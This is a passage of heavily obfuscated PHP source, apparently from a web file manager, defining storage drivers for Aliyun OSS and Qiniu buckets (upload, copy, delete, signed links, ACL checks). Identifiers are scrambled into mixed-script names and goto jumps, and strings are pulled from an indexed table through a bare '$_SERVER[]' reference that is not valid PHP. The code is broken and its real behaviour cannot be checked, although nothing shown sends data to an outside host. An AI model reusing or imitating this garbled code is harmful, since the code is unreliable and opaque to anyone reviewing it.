str_replace(array($BԻ[1007], $BԻ[217]), array($BԻ[1008], $BԻ[1009]), $c); $EϠ[] = str_replace($BԻ[55], $BԻ[1010], $c); } return $BԻ[55] . implode($BԻ[1011], $EϠ) . $BԻ[55]; } private function sqlDecode($aᝋ, $A) { $CΊϽ =& $_SERVER[]; $aᝋ = str_replace(array($CΊϽ[1008], $CΊϽ[1009]), array($CΊϽ[1007], $CΊϽ[217]), $aᝋ); if ($A == $CΊϽ[9]) { $aᝋ = stripslashes($aᝋ); } return $aᝋ; } } goto Eۇ; F: define($_SERVER[][1951], 4); define($_SERVER[][1952], 5); define($_SERVER[][1953], 16); goto AȘ; Dޗ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($F) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1187]; $this->_init($F); } public function _init($b) { foreach ($b as $cޭ => $Cۍ) { if (isset($this->{$cޭ})) { $this->{$cޭ} = $Cۍ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[][1188], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto d؂; b: $a좃ϳ->addAllowedOrigin($C֯ζ[1189]); $a좃ϳ->addAllowedMethod($C֯ζ[1190]); $a좃ϳ->addAllowedMethod($C֯ζ[1191]); goto a׎; d؂: $C֯ζ =& $_SERVER[]; $f񣳥ц = new OSS\Model\CorsConfig(); $a좃ϳ = new OSS\Model\CorsRule(); goto b; C݇: $f񣳥ц->addRule($a좃ϳ); try { $this->client->putBucketCors($this->bucket, $f񣳥ц); } catch (OSS\Core\OssException $aĎ) { return !1; } return !0; goto Eϥ; bՉӻ: $a좃ϳ->setMaxAgeSeconds(600); $a좃ϳ->addExposeHeader($C֯ζ[1194]); $a좃ϳ->addAllowedHeader($C֯ζ[1189]); goto C݇; a׎: $a좃ϳ->addAllowedMethod($C֯ζ[1192]); $a좃ϳ->addAllowedMethod($C֯ζ[1193]); $a좃ϳ->addAllowedMethod($C֯ζ[155]); goto bՉӻ; Eϥ: } public function getBucketCors() { goto eȐǼ; cۏ߇բ: return array($F[175] => isset($fϑ[0]) ? $fϑ[0] : $F[33], $F[179] => $dٴ㟊, $F[1195] => $A, $F[1196] => isset($B䈿[0]) ? $B䈿[0] : $F[33], $F[177] => isset($b쓟[0]) ? $b쓟[0] : $F[33]); goto Aΐ; eȐǼ: $F =& $_SERVER[]; $F٫ͭ = null; try { $F٫ͭ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $EΙ) { return null; } goto BϾז; aᑎ: $A = $aˌ[0]->getMaxAgeSeconds(); $B䈿 = $aˌ[0]->getExposeHeaders(); $b쓟 = $aˌ[0]->getAllowedHeaders(); goto cۏ߇բ; BϾז: if (!$F٫ͭ || !($aˌ = $F٫ͭ->getRules())) { return null; } $fϑ = $aˌ[0]->getAllowedOrigins(); $dٴ㟊 = $aˌ[0]->getAllowedMethods(); goto aᑎ; Aΐ: } public function isBucketCors() { goto Aʥ; A揈: if ($cܷ[$F[175]] != $F[176] || $cܷ[$F[177]] != $F[176]) { return !1; } $A̙ = array_map($F[178], $cܷ[$F[179]]); if (!is_array($A̙)) { $A̙ = array(); } goto fϖŘ; Aʥ: $F =& $_SERVER[]; $cܷ = $this->getBucketCors(); if (!$cܷ || !is_array($cܷ)) { return !1; } goto A揈; fϖŘ: $a = array($F[180], $F[181], $F[182], $F[183], $F[184]); $bʶ䐝 = array_diff($a, $A̙); return empty($bʶ䐝); goto aЯʂ; aЯʂ: } public function mkfile($DŊ΄, $Aʔ = '', $B = REPEAT_RENAME) { $Fǅӣ = $this->setContent($DŊ΄, $Aʔ); if ($Fǅӣ !== !1) { return $this->getPathOuter($DŊ΄); } return !1; } public function mkdir($fֿ, $c܇ = REPEAT_SKIP) { if ($this->_isFolder($fֿ)) { return $this->getPathOuter($fֿ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($fֿ)); } catch (OSS\Core\OssException $EԚ) { return !1; } return $this->getPathOuter($fֿ); } private function fileList($fĩ, $dʳԼ = '', $dޢɐȜ = 0) { goto B뭎; B: while (!0) { $B = array($b[1197] => $dʳԼ, $b[186] => $e򵈇, $b[1198] => $eʦ, $b[1199] => $aꉣ); try { $f = $this->client->listObjects($this->bucket, $B); } catch (OSS\Core\OssException $d➳) { break; } $aꉣ = $f->getNextMarker(); $cڤ = $f->getObjectList(); $Eͥ = $f->getPrefixList(); foreach ($cڤ as $Eψۥ) { if ($Eψۥ->getKey() == $e򵈇) { continue; } $aˑ = $Eψۥ->getKey(); if ($dޢɐȜ) { $aˑ = array($b[28] => $aˑ, $b[77] => $Eψۥ->getSize(), $b[190] => strtotime($Eψۥ->getLastModified())); } $dΐ[] = $aˑ; } foreach ($Eͥ as $A٣) { $E򈎰[] = $A٣->getPrefix(); } if ($aꉣ === $b[33]) { break; } } return array($b[74] => $E򈎰, $b[73] => $dΐ); goto E駂; c槆: $aꉣ = $b[33]; $eʦ = 1000; $E򈎰 = $dΐ = array(); goto B; B뭎: $b =& $_SERVER[]; $fĩ = trim($fĩ, $b[8]); $e򵈇 = empty($fĩ) ? $b[33] : $fĩ . $b[8]; goto c槆; E駂: } public function copyFile($d̕徢, $C󹡖) { $dԂȈ = $this->size($d̕徢); if ($dԂȈ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $d̕徢, $this->bucket, $this->pathEncode($C󹡖)); } catch (OSS\Core\OssException $Cڇ) { return !1; } return $this->getPathOuter($C󹡖); } $c = $this->multiCopyObject($d̕徢, $C󹡖, $dԂȈ); return $c ? $this->getPathOuter($C󹡖) : !1; } private function multiCopyObject($fɊ, $B֑߰, $Fپ) { $A =& $_SERVER[]; try { goto c; f՗: $Bߓ = 1; $a = 0; $aù = array(); goto Dԟ; BԆ: $c = array(); foreach ($aù as $aÆɭߗ => $eߋ) { $c[] = array($A[1204] => $aÆɭߗ + 1, $A[1205] => $eߋ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B֑߰), $f, $c); goto f; c: $A = array(); if ($fʣ = $this->hashMd5($fɊ)) { $A = array(OSS\OssClient::OSS_HEADERS => array($A[1200] => $fʣ)); } $f = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B֑߰), $A); goto f՗; Dԟ: $fꅍ痼 = 1024 * 1024 * 10; $A = $this->client->generateMultiuploadParts($Fپ, $fꅍ痼); foreach ($A as $aÆɭߗ => $cŮ) { $BƧ = $a + (int) $cŮ[$A[1201]]; $B掖㳘 = (int) $cŮ[$A[325]] + $BƧ - 1; $eЋ = array($A[1202] => $BƧ, $A[1203] => $B掖㳘); $aù[] = $this->client->uploadPartCopy($this->bucket, $fɊ, $this->bucket, $this->pathEncode($B֑߰), $Bߓ, $f, $eЋ); $Bߓ = $Bߓ + 1; } goto BԆ; f: } catch (OSS\Core\OssException $cٛ) { return !1; } return !0; } public function moveFile($A׉, $Bۋ) { if ($this->copyFile($A׉, $Bۋ)) { $this->remove($A׉); return $this->getPathOuter($Bۋ); } return !1; } public function delFile($eđ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($eđ)); } catch (OSS\Core\OssException $e) { return !1; } return !0; } public function delFolder($C։) { $fҖ̍ =& $_SERVER[]; $aЅ = $this->fileList($C։); if (!empty($C։) && !in_array(trim($C։, $fҖ̍[8]) . $fҖ̍[8], $aЅ[$fҖ̍[73]])) { $aЅ[$fҖ̍[73]][] = trim($C։, $fҖ̍[8]) . $fҖ̍[8]; } foreach (array_chunk($aЅ[$fҖ̍[73]], 1000) as $f뾨) { try { $this->client->deleteObjects($this->bucket, $f뾨); } catch (OSS\Core\OssException $eż઼) { continue; } } return !0; } public function rename($bؓɯ, $A㇙) { return $this->renameObject($bؓɯ, $A㇙); } private function fileInfo($AԜ, $aً = array()) { goto d𿝠; Cީڠ: if (isset($aً[$f°ǃ[77]])) { $Eܸ[$f°ǃ[77]] = $aً[$f°ǃ[77]]; } if (isset($aً[$f°ǃ[107]])) { $Eܸ[$f°ǃ[107]] = $aً[$f°ǃ[107]]; } if (isset($aً[$f°ǃ[190]]) && !trim($Eܸ[$f°ǃ[107]])) { $Eܸ[$f°ǃ[107]] = $aً[$f°ǃ[190]]; } goto fЉ; d𿝠: $f°ǃ =& $_SERVER[]; $Eܸ = array($f°ǃ[28] => $this->pathThis($AԜ), $f°ǃ[75] => $this->getPathOuter($AԜ), $f°ǃ[29] => $f°ǃ[167], $f°ǃ[187] => 0, $f°ǃ[107] => 0, $f°ǃ[77] => 0, $f°ǃ[160] => $this->ext($AԜ), $f°ǃ[188] => !0, $f°ǃ[189] => !0); if (empty($aً)) { $b⥉ = $this->objectMeta($AԜ); if (!$b⥉) { return $Eܸ; } $aً = array($f°ǃ[107] => strtotime($b⥉[$f°ǃ[1206]]), $f°ǃ[77] => $b⥉[$f°ǃ[1207]] + 0); } goto Cީڠ; fЉ: return $Eܸ; goto AӖ抴; AӖ抴: } private function folderInfo($a, $a̅Ȯ = array()) { $dͦ =& $_SERVER[]; $d = array($dͦ[28] => $this->pathThis($a), $dͦ[75] => $this->getPathOuter($dͦ[8] . $a), $dͦ[29] => $dͦ[76], $dͦ[187] => 0, $dͦ[107] => 0, $dͦ[188] => !0, $dͦ[189] => !0); if (empty($a̅Ȯ)) { $a = rtrim($a, $dͦ[8]) . $dͦ[8]; $F = $this->objectMeta($a); if (!$F) { return $d; } $a̅Ȯ = array($dͦ[187] => $F[$dͦ[1208]][$dͦ[1209]], $dͦ[107] => strtotime($F[$dͦ[1206]])); } if (isset($a̅Ȯ[$dͦ[107]])) { $d[$dͦ[107]] = $a̅Ȯ[$dͦ[107]]; } if (isset($a̅Ȯ[$dͦ[187]])) { $d[$dͦ[187]] = $a̅Ȯ[$dͦ[187]]; } return $d; } public function listPath($E, $a園 = false) { $DȺ =& $_SERVER[]; $BǢ = $this->fileList($E, $DȺ[8], !0); foreach ($BǢ[$DȺ[74]] as $b => $BĆ) { $BǢ[$DȺ[74]][$b] = $this->folderInfo($BĆ, $BĆ); } foreach ($BǢ[$DȺ[73]] as $b => $BĆ) { $BǢ[$DȺ[73]][$b] = $this->fileInfo($BĆ[$DȺ[28]], $BĆ); } return $BǢ; } public function has($e⻼ޝՂ, $f⏪ = false, $BԈ = true) { goto eɠ; cϼ: $bڴ = 0; while (!0) { $fޞ = array($eƩ[1197] => $eƩ[8], $eƩ[186] => $C, $eƩ[1198] => $cټП, $eƩ[1199] => $eа); try { $cՓ = $this->client->listObjects($this->bucket, $fޞ); } catch (OSS\Core\OssException $E) { break; } $eа = $cՓ->getNextMarker(); $Fא = $cՓ->getObjectList(); $B᏶ = $cՓ->getPrefixList(); if ($f⏪) { if (count($Fא) > 1 || count($Fא) == 1 && $Fא[0]->getKey() != $C) { $CƢ += count($Fא) - 1; } if (!empty($B᏶)) { $bڴ += count($B᏶); } if ($eа === $eƩ[33]) { break; } continue; } if ($BԈ) { if (!empty($Fא)) { if (count($Fא) > 1 || $Fא[0]->getKey() != $C) { return !0; } } } else { if (!empty($B᏶)) { return !0; } } if ($eа === $eƩ[33]) { break; } } if ($f⏪) { return array($eƩ[191] => $CƢ, $eƩ[192] => $bڴ); } goto f; F˂ʋ: $eа = $eƩ[33]; $cټП = 500; $CƢ = 0; goto cϼ; f: return !1; goto B; eɠ: $eƩ =& $_SERVER[]; $e⻼ޝՂ = trim($e⻼ޝՂ, $eƩ[8]); $C = empty($e⻼ޝՂ) ? $eƩ[33] : $e⻼ޝՂ . $eƩ[8]; goto F˂ʋ; B: } public function listAll($F葪) { $Eǻ =& $_SERVER[]; $bʆ = $this->fileList($F葪, $Eǻ[33], !0); $bʘʃ = array(); foreach ($bʆ[$Eǻ[73]] as $Aþֹ) { $bʘʃ[$Aþֹ[$Eǻ[28]]] = $Aþֹ[$Eǻ[77]]; } return $this->listAllFiles($F葪, array_keys($bʘʃ), $bʘʃ); } public function canRead($B˂) { $EՓ =& $_SERVER[]; $e膞 = $this->pathAcl($B˂); return $e膞 == $EՓ[1210] || $e膞 == $EՓ[491] ? !0 : !1; } public function canWrite($D) { $D˻ = $this->pathAcl($D); return $D˻ == $_SERVER[][491] ? !0 : !1; } public function pathAcl($Dق˴) { goto c岅; Dĩ: $f = $Dɦˉ == $E꫾[34] ? $this->bucketAcl : $Dɦˉ; if ($f == $E꫾[1211]) { return $E꫾[1210]; } if ($f == $E꫾[1212]) { return $E꫾[491]; } goto eƷ; c岅: $E꫾ =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Dɦˉ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Dق˴)); } catch (OSS\Core\OssException $Fӹ) { return !1; } goto Dĩ; eƷ: return $f; goto D̊Џ; D̊Џ: } private function chmodPath($cֽ塃, $CԬ = '') { $D =& $_SERVER[]; $B͉Ȩ = empty($CԬ) ? $D[1212] : $CԬ; $dچ鱃 = array($D[34], $D[185], $D[1211], $D[1212]); if (!in_array($B͉Ȩ, $dچ鱃)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($cֽ塃), $B͉Ȩ); } catch (OSS\Core\OssException $Fɡ) { return !1; } return !0; } public function getContent($E║) { return $this->fileSubstr($E║, -1); } public function setContent($e卶, $e΄ = '') { $A =& $_SERVER[]; try { $F͹ = $this->trafficLimit($A[1213]); $Fх = $this->client->putObject($this->bucket, $this->pathEncode($e卶), $e΄, $F͹); } catch (OSS\Core\OssException $Dǻ) { return !1; } $Fϸ = array($A[1200] => trim($Fх[$A[1214]], $A[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e卶))); $this->updateObjMeta($e卶, $Fϸ); return isset($Fх[$A[1215]][$A[1162]]) ? (int) $Fх[$A[1215]][$A[1162]] : strlen($Fх); } private function updateObjMeta($b, $B) { $b = $this->pathEncode($b); try { $dז = array(OSS\OssClient::OSS_HEADERS => $B); $this->client->copyObject($this->bucket, $b, $this->bucket, $b, $dז); } catch (OSS\Core\OssException $Bٟ) { return !1; } return !0; } public function upload($f, $d, $eƤ = false, $c = REPEAT_REPLACE) { $cݭ =& $_SERVER[]; $C惹 = trim($f, $cݭ[8]); $A߇ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($cݭ[1200] => @md5_file($d)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f))); $A߇ = $this->trafficLimit($cݭ[1213], $A߇); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($C惹), $d, $A߇); } catch (OSS\Core\OssException $f؉) { return !1; } return $this->getPathOuter($f); } public function getHost() { $eʗ =& $_SERVER[]; $eɋ = explode($eʗ[171], parent::getHost()); return $eɋ[0] . $eʗ[171] . $this->bucket . $eʗ[91] . $eɋ[1]; } public function uploadFormData($A۹, $aȔ = 3600) { goto e癪; eަ: $a˨ԯ = date($cط[1216], time() + $e); $dϘ = new DateTime($a˨ԯ); $dȵ = $dϘ->format(DateTime::ISO8601); goto a΅; c򜴤: $Bу = $this->pathFather($A۹); $d΃ = array($cط[1117] => $dȵ, $cط[1118] => array(array($cط[1218], 0, $Fӻ), array($cط[1121], $cط[1122], $Bу))); $DҴ = base64_encode(json_encode($d΃)); goto B鳏ޙ; e癪: $cط =& $_SERVER[]; if (!($A = $this->getHost())) { return !1; } $e = $aȔ; goto eަ; B鳏ޙ: $DŠ = base64_encode(hash_hmac($cط[218], $DҴ, $this->secret, !0)); $bȻ = array($cط[1127] => $DҴ, $cط[1219] => $this->accessKey, $cط[1123] => $cط[1115], $cط[1220] => $DŠ, $cط[169] => $A); $bȻ = $this->trafficLimit($cط[1213], $bȻ); goto B; a΅: $a춌 = strpos($dȵ, $cط[284]); $dȵ = substr($dȵ, 0, $a춌) . $cط[1217]; $Fӻ = 1048576000 * 5; goto c򜴤; B: return $bȻ; goto bǸ; bǸ: } public function multiUploadFormData($cߒ, $bȕ = 3600) { $F܎ =& $_SERVER[]; if (!($c띠 = $this->getHost())) { return !1; } $DǱ = $this->trafficLimit($F܎[1213]); $A˩Ш = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cߒ), $DǱ); return array($F܎[209] => $A˩Ш, $F܎[169] => $c띠 . $F܎[8] . $this->pathEncode($cߒ), $F܎[210] => gmdate($F܎[1221]), $F܎[89] => $cߒ); } public function multiUploadAuthData($B, $E㛛 = array()) { goto f܉; d˚: $fą = $dܴэ[1224] . $this->accessKey . $dܴэ[4] . $cȫ; if (strpos($BȄ, $dܴэ[213]) === 0) { $fą = array($dܴэ[220] => $fą, $dܴэ[210] => $E); if ($Fӑ) { $fą = array_merge($fą, $Fӑ); } } return $fą; goto A߉꧓; f܉: $dܴэ =& $_SERVER[]; $E = isset($E㛛[$dܴэ[210]]) ? $E㛛[$dܴэ[210]] : gmdate($dܴэ[1221]); $BȄ = isset($E㛛[$dܴэ[160]]) ? $E㛛[$dܴэ[160]] : $dܴэ[33]; goto FҊ; b֙: if (!empty($E㛛[$dܴэ[1223]])) { $CӼ = array_merge(array($d˅[4]), $E㛛[$dܴэ[1223]]); sort($CӼ); $d˅[4] = implode($dܴэ[217], $CӼ); } $e煟 = implode($dܴэ[217], $d˅); $cȫ = base64_encode(hash_hmac($dܴэ[218], $e煟, $this->secret, !0)); goto d˚; FҊ: $C = $B; if (isset($E㛛[$dܴэ[89]])) { $C = $E㛛[$dܴэ[89]]; unset($E㛛[$dܴэ[89]]); } if (isset($E㛛[$dܴэ[211]])) { $E㛛[$dܴэ[210]] = $E; return $this->listUploadParts($C, $E㛛); } goto eٚ𭲇; eٚ𭲇: $d˅ = array($dܴэ[212], $dܴэ[33], $dܴэ[116], $E, "\x78\55\x6f\x73\x73\55\144\141\164\x65\72{$E}", $dܴэ[8] . $this->bucket . $dܴэ[8] . $C . $BȄ); if (strpos($BȄ, $dܴэ[213]) === 0) { $d˅[0] = $dܴэ[214]; if ($Fӑ = $this->trafficLimit($dܴэ[1213])) { $C = $dܴэ[1222]; array_splice($d˅, 5, 0, $C . $dܴэ[4] . $Fӑ[$C]); } } if (isset($E㛛[$dܴэ[215]]) && $E㛛[$dܴэ[215]] == $dܴэ[216]) { $d˅[0] = $dܴэ[216]; } goto b֙; A߉꧓: } public function listUploadParts($bã, $E) { goto b퍶; bцǷ: unset($E[$BȾح[211]], $E[$BȾح[215]]); $bͶ = $this->multiUploadAuthData($bã, $E); if (empty($bͶ)) { return !1; } goto Aߟ廳; e˃: $A = $Bҭ->getListPart(); $A髃﨑 = array(); foreach ($A as $dꄕ) { $A髃﨑[] = array($BȾح[1204] => $dꄕ->getPartNumber(), $BȾح[1205] => trim($dꄕ->getETag(), $BȾح[113])); } goto bцǷ; b퍶: $BȾح =& $_SERVER[]; $A = parse_url_query($E[$BȾح[160]]); $Bҭ = $this->client->listParts($this->bucket, $this->pathEncode($bã), $A[$BȾح[209]]); goto e˃; Aߟ廳: return array($BȾح[220] => $bͶ, $BȾح[210] => $E[$BȾح[210]], $BȾح[222] => $A髃﨑); goto D; D: } public function download($C͸, $aߡ) { if ($this->isFolder($C͸)) { return !1; } try { $b = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $aߡ); $b = $this->trafficLimit($_SERVER[][105], $b); $this->client->getObject($this->bucket, $this->pathEncode($C͸), $b); } catch (OSS\Core\OssException $b˽ݑʛ) { return !1; } return $aߡ; } public function fileSubstr($d˹ݚ, $Eא = 0, $d = false) { if ($Eא === -1) { $c = array(); } else { if ($d === !1) { $FҹϠ = $this->size($d˹ݚ); } else { $FҹϠ = $Eא + $d - 1; } $c = array(OSS\OssClient::OSS_RANGE => "{$Eא}\x2d{$FҹϠ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d˹ݚ), $c); } catch (OSS\Core\OssException $Aşٲ) { think_exception($Aşٲ->getMessage()); return !1; } } private function trafficLimit($C訐ʐ, $Fϝԇ = array()) { goto e; B: if (!$Aʥ) { return $Fϝԇ; } $Aʥ = $Aʥ < 819200 ? 819200 : ($Aʥ > 838860800 ? 838860800 : $Aʥ); $Fϝԇ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Aʥ); goto b͵ˎ; e: $Fӊ =& $_SERVER[]; if ($C訐ʐ == $Fӊ[1213] && $this->isUploadServer() || $C訐ʐ == $Fӊ[105] && $this->isFileOutServer()) { return $Fϝԇ; } $Aʥ = floatval($GLOBALS[$Fӊ[6]][$Fӊ[84]][$Fӊ[103]][$C訐ʐ]) * 1024 * 1024 * 8; goto B; b͵ˎ: return $Fϝԇ; goto f͐; f͐: } public function link($c, $cڱ = array()) { $b =& $_SERVER[]; if (!$this->exist($c) || $this->isFolder($c)) { return !1; } try { $cڱ = $this->trafficLimit($b[105], $cڱ); $Bô߉ = $this->client->signUrl($this->bucket, $this->pathEncode($c), 3600 * 12, $b[216], $cڱ); return $this->getCdnLink($Bô߉); } catch (OSS\Core\OssException $B֭) { return !1; } } public function fileOut($a, $aۊ، = false, $bď = false, $C򭊛 = '') { goto Eｯ; a: $this->fileOutLink($E۷); goto Eᅭ; f퓡: $c = array(OSS\OssClient::OSS_SUB_RESOURCE => $D[1225] . rawurlencode("{$aۊ،}\73\146\151\x6c\145\x6e\141\x6d\145\75{$bď}")); $c[OSS\OssClient::OSS_SUB_RESOURCE] .= $D[1226] . rawurlencode($bЄ); $E۷ = $this->link($a, $c); goto a; E: $bЄ = get_file_mime(get_path_ext($bď)); if ($bЄ == $D[201]) { return parent::fileOut($a, $aۊ،, $bď, $C򭊛); } $aۊ، = $aۊ، ? $D[202] : $D[203]; goto f퓡; Eｯ: $D =& $_SERVER[]; if (!$bď) { $bď = $this->pathThis($a); } $bď = rawurlencode($bď); goto E; Eᅭ: } public function fileOutServer($eԡɃ, $E֌ = false, $Aګ䝒 = false, $D = '') { parent::fileOut($eԡɃ, $E֌, $Aګ䝒, $D); } public function fileOutImage($Cǻà, $B = 250) { $d = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1227] . $B); $EǷ = $this->link($Cǻà, $d); $this->fileOutLink($EǷ); } public function fileOutImageServer($Fҵ, $e = 250) { parent::fileOutImage($Fҵ, $e); } public function fileOutLink($A֑) { $Bޅ =& $_SERVER[]; if (!$this->isCdnHost() && substr($A֑, 0, 7) == $Bޅ[1130]) { $A֑ = $Bޅ[1131] . substr($A֑, 7); } header($Bޅ[156] . $A֑); die; } public function hashMd5($C, $fɰ = '') { $cޗͭ =& $_SERVER[]; $E՟ = $this->objectMeta($C); if (!$E՟) { return $cޗͭ[33]; } if (!isset($E՟[$cޗͭ[1200]]) && !empty($fɰ)) { $D = $this->updateObjMeta($C, array($cޗͭ[1200] => $fɰ)); $E՟[$cޗͭ[1200]] = $D ? $fɰ : $cޗͭ[33]; } return isset($E՟[$cޗͭ[1200]]) ? strtolower($E՟[$cޗͭ[1200]]) : $cޗͭ[33]; } public function size($A߮) { $f۷ς = $this->objectMeta($A߮); return $f۷ς ? $f۷ς[$_SERVER[][77]] : 0; } public function info($fМ) { if ($this->isFolder($fМ)) { return $this->folderInfo($fМ); } else { if ($this->isFile($fМ)) { return $this->fileInfo($fМ); } } return !1; } public function exist($FƸԍ) { return $this->isFile($FƸԍ) || $this->isFolder($FƸԍ); } public function isFile($A犲׊) { return !$this->isFolder($A犲׊) && $this->objectMeta($A犲׊); } public function isFolder($b) { return $this->cacheMethod($_SERVER[][223], $b); } protected function objectMeta($fǉ) { return $this->cacheMethod($_SERVER[][224], $fǉ); } protected function _objectMeta($c) { $Bݛ =& $_SERVER[]; try { $Eݶ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($c)); } catch (OSS\Core\OssException $DԽ) { $Eݶ = !1; } if ($Eݶ) { $Eݶ[$Bݛ[77]] = intval($Eݶ[$Bݛ[1207]]); } return $Eݶ; } protected function _isFolder($D֧) { $b䆍 =& $_SERVER[]; if ($D֧ == $b䆍[33] || $D֧ == $b䆍[8]) { return !0; } $b򿌆 = array($b䆍[1197] => $b䆍[8], $b䆍[186] => rtrim($D֧, $b䆍[8]) . $b䆍[8], $b䆍[1198] => 1, $b䆍[1199] => $b䆍[33]); $fʖ = $this->client->listObjects($this->bucket, $b򿌆); if ($fʖ->getObjectList() || $fʖ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Cʕđ) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1228]; $this->_init($Cʕđ); } public function _init($Aßέ) { foreach ($Aßέ as $Eؘ => $DՎ) { if (isset($this->{$Eؘ})) { $this->{$Eؘ} = $DՎ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[][1229], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($C±, $e = '', $fޙ = REPEAT_RENAME) { if ($this->setContent($C±, $e)) { return $this->getPathOuter($C±); } return !1; } public function mkdir($A˽τ, $D = REPEAT_SKIP) { goto Cׅɺ; Cׅɺ: $bՉ =& $_SERVER[]; $B = trim($A˽τ, $bՉ[8]); if ($this->_isFolder($B)) { return $this->getPathOuter($B); } goto dσ; dσ: $A˽τ = $B . $bՉ[8]; $d = get_path_this($B); $Bۓ = $A˽τ . $d; goto B݌; B݌: if (!$this->mkfile($Bۓ)) { return !1; } if (!$this->moveFile($Bۓ, $A˽τ)) { $this->delFile($Bۓ); return !1; } return $this->getPathOuter($B); goto bϒ; bϒ: } public function copyFile($fƊ, $B؈) { $e״ = $this->bucketManager->copy($this->bucket, $fƊ, $this->bucket, $B؈, !0); return $e״ ? !1 : $this->getPathOuter($B؈); } public function moveFile($aқ, $fٙ֎) { $bҴ = $this->bucketManager->move($this->bucket, $aқ, $this->bucket, $fٙ֎, !0); return $bҴ ? !1 : $this->getPathOuter($fٙ֎); } public function delFile($e) { $AΪ = $this->bucketManager->delete($this->bucket, $e); return $AΪ ? !1 : !0; } public function delFolder($cᩅ) { $fя = $this->fileList($cᩅ); if (empty($fя)) { return !0; } $B = 1000; if (count($fя) <= $B) { return $this->qnDelObj($fя) ? !1 : !0; } foreach (array_chunk($fя, $B) as $A) { $f臛牠 = $this->qnDelObj($A); if ($f臛牠) { return !1; } } return !0; } private function qnDelObj($D) { $DӞ導 = $this->bucketManager->buildBatchDelete($this->bucket, $D); list($c፠, $d̈́) = $this->bucketManager->batch($DӞ導); return $d̈́; } private function fileList($bӻ, $bɅ = 0) { goto F׹; EȆ: $Bڊ = array(); while (!0) { list($EĦ, $eل) = $this->bucketManager->listFiles($this->bucket, $b, $Dъ, $b, $f); if ($eل) { return !1; } $Dъ = array_key_exists($dȸ[1199], $EĦ) ? $Dъ = $EĦ[$dȸ[1230]] : $dȸ[33]; foreach ($EĦ[$dȸ[1231]] as $eʅ) { $Eˇй = $eʅ[$dȸ[89]]; if ($bɅ) { $Eˇй = array($dȸ[28] => $Eˇй, $dȸ[77] => $eʅ[$dȸ[1232]]); } $Bڊ[] = $Eˇй; } if ($Dъ == $dȸ[33]) { break; } } return $Bڊ; goto D檣; dމ: $Dъ = $dȸ[33]; $b = 1000; $f = $dȸ[33]; goto EȆ; F׹: $dȸ =& $_SERVER[]; $bӻ = trim($bӻ, $dȸ[8]); $b = empty($bӻ) ? $dȸ[33] : $bӻ . $dȸ[8]; goto dމ; D檣: } public function rename($AΕ, $f) { return $this->renameObject($AΕ, $f); } public function fileInfo($E, $A = false, $EÌ = array()) { goto aђ; aђ: $fߩ =& $_SERVER[]; if ($A) { return array($fߩ[28] => $this->pathThis($E), $fߩ[75] => $this->getPathOuter($fߩ[8] . $E), $fߩ[29] => $fߩ[167], $fߩ[77] => isset($EÌ[$fߩ[1232]]) ? $EÌ[$fߩ[1232]] : 0, $fߩ[160] => $this->ext($E)); } $C葍 = array($fߩ[28] => $this->pathThis($E), $fߩ[75] => $this->getPathOuter($fߩ[8] . $E), $fߩ[29] => $fߩ[167], $fߩ[187] => 0, $fߩ[107] => 0, $fߩ[77] => 0, $fߩ[160] => $this->ext($E), $fߩ[188] => !0, $fߩ[189] => !0); goto cֈ; Dۊ: return $C葍; goto eͤ; cֈ: if (empty($EÌ)) { $EÌ = $this->objectMeta($E); if (!$EÌ) { return $C葍; } } if (isset($EÌ[$fߩ[1233]])) { $C葍[$fߩ[107]] = substr($EÌ[$fߩ[1233]] . $fߩ[33], 0, 10); } if (isset($EÌ[$fߩ[1232]])) { $C葍[$fߩ[77]] = $EÌ[$fߩ[1232]]; } goto Dۊ; eͤ: } public function folderInfo($c, $D = false) { goto d؃; Fّ: $c = rtrim($c, $dБ[8]) . $dБ[8]; $F = $this->objectMeta($c); if (isset($F[$dБ[1233]])) { $f䰘[$dБ[107]] = substr($F[$dБ[1233]] . $dБ[33], 0, 10); } goto a𿑃; a𿑃: return $f䰘; goto e呍; d؃: $dБ =& $_SERVER[]; if ($D) { return array($dБ[28] => $this->pathThis($c), $dБ[75] => $this->getPathOuter($dБ[8] . $c), $dБ[29] => 